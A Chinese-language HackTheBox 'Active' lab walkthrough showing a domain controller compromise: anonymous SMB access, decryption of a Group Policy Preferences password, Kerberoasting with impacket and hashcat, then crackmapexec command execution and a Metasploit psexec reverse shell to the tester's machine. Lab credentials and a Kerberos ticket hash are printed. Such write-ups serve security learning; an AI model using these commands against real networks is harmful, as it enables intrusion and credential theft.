---
title: "HackTheBox：Active笔记"
slug: wmcm5q
date: 2020-06-27T23:09:32+08:00
source: yuque/penetration
---

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593282512907-313f899a-aeaf-4fd0-ba16-87cc06dacf44.png)

10.10.10.100

# Nmap
```powershell
#	nmap -p- -sC -sV -oA allport.nmap 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.0036s latency).
Not shown: 65512 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-27 14:12:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49180/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m57s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-27T14:13:29
|_  start_date: 2020-06-27T12:57:05
```

用`enum4linux`工具扫描，发现smb服务是开着的，且有开放的共享目录

```markdown
# enum4linux -a 10.10.10.100
========================================= 
|    Share Enumeration on 10.10.10.100    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
...
[+] Attempting to map shares on 10.10.10.100
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/ADMIN$	Mapping: DENIED, Listing: N/A

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/C$	Mapping: DENIED, Listing: N/A

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/IPC$	Mapping: OK	Listing: DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/NETLOGON	Mapping: DENIED, Listing: N/A

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Replication	Mapping: OK, Listing: OK

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/SYSVOL	Mapping: DENIED, Listing: N/A

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Users	Mapping: DENIED, Listing: N/A


```

看看里面都有些啥文件

# smb -> group.xml
```markdown
# smbmap -H 10.10.10.100   
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
        Disk                   	Permissions	Comment
	----                   	-----------	-------
	ADMIN$             	NO ACCESS	Remote Admin
	C$                 	NO ACCESS	Default share
	IPC$               	NO ACCESS	Remote IPC
	NETLOGON           	NO ACCESS	Logon server share 
	Replication        	READ ONLY	
	SYSVOL             	NO ACCESS	Logon server share 
	Users              	NO ACCESS
```

空密码登录上去，成了。（此处也可用这种方式来空密码    登录`smbclient //10.10.10.100/Replication -U %`

```markdown
# smbclient -H //10.10.10.100/Replication -R -U '' 
handle_name_resolve_order: WARNING: Ignoring invalid list value '-U' for parameter 'name resolve order'
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 

```

发现了个名为`cpassword`的敏感信息

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593275741345-89a571a5-0b88-429d-959a-04f87555181f.png)

# 密码破解:gpp
一番搜索得知，这个密码就是windows的密码，不过是用AES加了密的，可是微软官方[在这里](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2)提供了解密的密钥，导致可以获取原密码。理论支撑[在这里](https://blog.compass-security.com/2012/04/exploit-credentials-stored-in-windows-group-policy-preferences/)。

此处我们采用脚本[gpprefdecrypt.py](https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py)进行解密（当然用kali自带的`gpp-decrypt`也行

```markdown
# python Gpprefdecrypt.py 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
	GPPstillStandingStrong2k18
```

至此，我们已经获得一组用户的帐号密码`SVC_TGS : GPPstillStandingStrong2k18`，域名称是`active.htb`

由于靶机的5985/5986端口未开放，不能用evil-rm来验证。可以用msf里的`smb_login`模块，来验证这个凭据是否有效。

不过这里，我采用smbclient来登录到共享文件夹，从而获取`user.txt`

```markdown
# smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18
```

此外，还有一个cme[`crackmapexec`]，作为windows域渗透时常用到的工具，也可以登录并执行命令（执行命令需system权限），如图

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593357285845-a8a530b3-f6b1-4708-9d0a-9dbf5c1984c6.png)

登录

```markdown
# crackmapexec  smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 

SMB    10.10.10.100    445    DC    [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB    10.10.10.100    445    DC    [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 

```

问题来了，怎么拿到user的shell呢

尝试使用msf的windows/smb/psexec模块，结果失败，原因是模块必须要管理员权限（下文有写到）

> This module uses a **valid administrator username** and password (or
>
>  password hash) to execute an arbitrary payload.
>

一番操作无果，无奈寻找其它方式

# 提权:Kerberoasting


关于`Kerberoasting`的详细说明，三好学生师傅[在这里](https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/)已经说得很好了。简单来说，这种方式主要有如下几个要点：

1. 域内的主机都能查询SPN。因此利用时可以考虑以下两种关系
    - 该SPN注册在域用户帐户(Users)下 => administrator是默认的用户
    - 域用户账户的权限很高    =>  administrator权限当然很高
2. 域内的任何用户都可以向域内的任何服务请求TGS    =>    此处由`SVC_TGS`到`administrator`
3. 在kerberos认证过程的第4步中，用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)，加密算法为`RC4-HMAC`，有现成的爆破工具(hashcat)。有兴趣了解这种算法的师傅可以在[rfc4757:RC4-HMAC](https://tools.ietf.org/html/rfc4757)中找到更多信息。
4. 当获得这个TGS后，我们可以使用密码字典，模拟加密过程，一次次生成TGS进行比较，来尝试穷举口令。



同时，根据att&ck框架的描述，这种攻击手法可以用以下几种方式来完成

> Kerberoasting, Technique T1208 - Enterprise | MITRE ATT&CK®
>
> [https://attack.mitre.org/techniques/T1208/](https://attack.mitre.org/techniques/T1208/)
>
> 
>
> [](https://attack.mitre.org/techniques/T1208/)
>

| Name | Description |
| --- | --- |
| [ Empire ](https://attack.mitre.org/software/S0363) | [Empire](https://attack.mitre.org/software/S0363) uses [PowerSploit](https://attack.mitre.org/software/S0194)'s `Invoke-Kerberoast` to request service tickets and return crackable ticket hashes.[<sup>[10]</sup>](https://github.com/PowerShellEmpire/Empire) |
| [ Impacket ](https://attack.mitre.org/software/S0357) | [Impacket](https://attack.mitre.org/software/S0357) modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.[<sup>[9]</sup>](https://www.secureauth.com/labs/open-source-tools/impacket) |
| [ PowerSploit ](https://attack.mitre.org/software/S0194) | [PowerSploit](https://attack.mitre.org/software/S0194)'s `Invoke-Kerberoast` module can request service tickets and return crackable ticket hashes.[<sup>[8]</sup>](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)[<sup>[5]</sup>](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/) |




这里采用impacket套件的`GetUserSPNs`脚本，运行

```markdown
# impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS -request                                   
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py:438: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if userDomain is '':
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                  
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 03:06:40.351723  2018-07-31 01:17:40.656520 

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$22e12dfea4b9454f2eb6bc1532ce33da$71a6ca7735386847e09dba2becbc27c296c0cc3d5bf52d4a9ced6504fb07d4cfede8199a9eee2190c24f5033c2c34408dfbc6cbf857ae55681913eaae1c8cc05699beb165b6946483150410fff3cd7e817bf45ba99825b10b1e5a9965b1b2aff022b469de01e7d6a28ae728bf46a43da29e78133d0abdd3aa3da7059385d1a331047f730455d6153e391303436821a317d2c1fa610464f92e3a9374ba87520b44a00b8d01a0db658c91a46d611bd1b1ac14a2a99b6ad296e07a845c5eebda3e82e36075d4bea9ca98e9e6c1a375510ac53ff1d9334851370cbb25d3b2941231ef4ac08c76b5c6d733927a6664e5db73f8b6681a10e252ee99d07049fd2646969bb40b7cec54349ee024403a8112dc90b8d148d3cdbe19a8141a3b6724ba6107bc112aab92e9b7a6f4123566c425082e84e5937defec68499ddc827fb3298c9057cb919fff3436f28250d359a6d65e21094932a362e3ed163ed297566da663db3c629de4b15ee5a6041483b4d3c2d94546b46b0ff589fe86a83446a3290b157dc769716beff038a7cf1ec999c8d81b5bdcd92c2820c159c6c786efd0a592ddc4f70286b666e423f857aa39245a11cce82a4e586103af79c8f1c8922bcdb02e0ac367c21003c574b35b63094c2dd99f9cbec01bde35ec1629f30cb8a0d7fdb120065359fba1884b5b4010798f9b9f5f76a4f72fca8f8b9e1ce8e3b9d3ebc3913a655860f7da052f298369483b3e5a024fd264a44ee1af3b1b30f62f3443aa1d690c2f953d03937504d248cd93f01c0152873780de1063ed40f960e2fb285ba6c82a9e723bc513b69b07f48ef65e61bb98e066e78deded46e9c879384fc36f41997958a135611bc637f44a0a34fe31729da3d1a4dd3822d6a381844257befd36aaa677d80b8a617c7c1f6085d3a6fde8121ff458a12600088d73ccccd9cd343385163f0a1ad40d551062db8dedd4d0247b7ceca5d6871dbec589a91cd935840c307b51255687d240b83e2eafe9134f568e40639d3c386a4ebdb8ac716405d14163435d4297c5265a1a2904a4d3a2d241516aa5dc68b66f2bd88b20443aa5f40539b5403f1dc0cbdfb77e803a63dcd633f94be80bf7aa625322f30b4ae43489d965e844fb9fe074874b4d42607c452ad0cce4f7a7fd33079baebc973b0a5c6a23951753eec8eeb93dcc97f36fc1662f9fc51ef2be91a40ea8009d5cc76cfaaf756194a8c66e8e906db5fda9003b4cd673edd19012f2870c748b4e089

## 参数说明
-dc-ip 							域控的ip地址，此处靶机就是域控
active.htb/SVC_TGS 	域名称+用户名
-request						请求用户的TGS，并且按照JtR或者/hashcat能识别的格式打印出来（默认关闭）
-outputfile					以JtR/hashcat的格式输出到文件中
```

得到一串管理员的hash，用hashcat解密

> [](https://hashcat.net/wiki/doku.php?id=example_hashes)
>

```markdown
# hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force    -o res.txt 

# cat res.txt
...master1968(省略部分信息)
```

登录smb即可获取root.txt

```powershell
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18  
```

或者用老外爱用的cme（即CrackMapExec）

```markdown
# crackmapexec  smb 10.10.10.100 -u Administrator -p "Ticketmaster1968"  --pass-pol         
//查看域内密码策略 --pass-pol  
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)

# crackmapexec  smb 10.10.10.100 -u Administrator -p "Ticketmaster1968"  -x whoami
//执行命令 -x 
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.10.10.100    445    DC               [+] Executed command 
SMB         10.10.10.100    445    DC               active\administrator

```

也可用msf里的psexec拿shell，要求管理员权限

```powershell
use windows/smb/psexec

//输入帐号密码即可，例如
//...
msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.16.122:4444 
[*] 10.10.10.100:445 - Connecting to the server...
[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445 as user 'Administrator'...
[*] 10.10.10.100:445 - Selecting PowerShell target
[*] 10.10.10.100:445 - Executing the payload...
[+] 10.10.10.100:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 10.10.10.100
[*] Meterpreter session 1 opened (10.10.16.122:4444 -> 10.10.10.100:50831) at 2020-06-28 01:59:35 +0800

```

# 附录
## 在smb中批量下载文件的方法
[原文链接](https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient)

```powershell
  smbclient '\\server\share'
    mask ""
    recurse ON
    prompt OFF
    cd 'path\to\remote\dir'
    lcd '~/path/to/download/to/'
    mget *


smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'
```

## 递归列出smb目录
```markdown
# smbmap -H 10.10.10.100 -R -u ''
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	.\Replication\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	active.htb
	.\Replication\active.htb\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	scripts
	.\Replication\active.htb\DfsrPrivate\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	ConflictAndDeleted
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	Deleted
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	Installing
	.\Replication\active.htb\Policies\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	fr--r--r--               23 Sat Jul 21 18:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	USER
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	fr--r--r--              119 Sat Jul 21 18:38:11 2018	GPE.INI
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	Preferences
	fr--r--r--             2788 Sat Jul 21 18:38:11 2018	Registry.pol
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	Windows NT
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	Groups
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	fr--r--r--               22 Sat Jul 21 18:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	USER
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	Microsoft
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 18:37:44 2018	Windows NT
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	

```

## 用hashcat破解密码
以这里的为例

```markdown
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

| 13100 | Kerberos 5 TGS-REP etype 23 |
| --- | --- |


> ——[https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
>



+ `-a 0 `代表使用字典破解模式；
+ `-m 0`代表Hash Type，此处查表知，对应编号为`13100`；
+ `--force`代表运行时无视错误

# reference
+ walkthrough:[https://0xdf.gitlab.io/2018/12/08/htb-active.html](https://0xdf.gitlab.io/2018/12/08/htb-active.html)
+ [域控提权合集 - 先知社区](https://xz.aliyun.com/t/7726#toc-2)
+ hashcat的各种格式[https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
+ CME的使用方法介绍[https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
+ How-To-Attack-Kerberos-101: [https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
+ [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences – Active Directory Security](https://adsecurity.org/?p=2288)
+ [https://www.lifewire.com/how-to-find-a-users-security-identifier-sid-in-windows-2625149](https://www.lifewire.com/how-to-find-a-users-security-identifier-sid-in-windows-2625149)
+ [https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/](https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/)



